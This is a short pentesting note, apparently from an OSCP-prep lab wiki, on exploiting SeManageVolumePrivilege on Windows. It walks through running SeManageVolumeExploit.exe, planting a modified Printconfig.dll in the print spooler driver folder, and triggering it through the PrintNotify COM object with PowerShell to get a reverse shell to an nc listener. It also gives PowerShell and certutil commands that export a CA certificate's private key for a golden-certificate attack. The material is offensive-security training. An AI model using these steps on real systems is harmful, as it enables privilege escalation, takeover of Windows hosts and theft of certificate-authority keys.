https://banua.medium.com/proving-grounds-access-oscp-prep-2025-practice-7-557f902bf1a9
 labs: [[Certificate]]

You have `SeManageVolumeExploit.exe` you can transfer it and run it. And you have `Printconfig.dll` that you need to change its code because of different IP or different command you want to run.


When you run `SeManageVolumeExploit.exe` it gives you read, write permission in most of the system files, ==But some of them you still can't access==. So, it depend on what files you can access.
if `C:\Windows\System32\spool\drivers\x64\3\` is not in the system you still have a chance to do many other things. Ex `Accessing privileged certificates`, `ssh files`.


---
### Classic exploit

First you should run `SeManageVolumeExploit.exe` this give you access to `C:\` so you can inject `Printconfig.dll` at `C:\Windows\System32\spool\drivers\x64\3\Printconfig.dll`
Then, Initiate the PrintNotify object by executing the following PowerShell commands:
```
$type = [Type]::GetTypeFromCLSID("{854A20FB-2D44-457D-992F-EF13785D2B51}")  
$object = [Activator]::CreateInstance($type)
```
Check nc listener GG.

---
### CA Certificate
If you are in CA server, the CA certificate private key my be present on the server, but you can't read it in normal ways. So by running `SeManageVolumeExploit.exe` you will have permission to see them.
```powershell
Get-ChildItem Cert:\LocalMachine\My | ForEach-Object { $thumb = $_.Thumbprint; $subj  = $_.Subject; $hasPK = if ($_.HasPrivateKey) {'yes'} else {'no'}; $ku = ($_.Extensions | Where-Object { $_.Oid.Value -in @('2.5.29.15','2.5.29.19') } ).Format($false) ;[pscustomobject]@{Thumb=$thumb; Subject=$subj; HasPrivateKey=$hasPK; KeyUsage=$ku} } | Format-Table -AutoSize

certutil -exportPFX My <certificate Serial number> Certificate-LTD-CA.pfx
```

refer to [[Golden Certificate]] to complete the exploitation.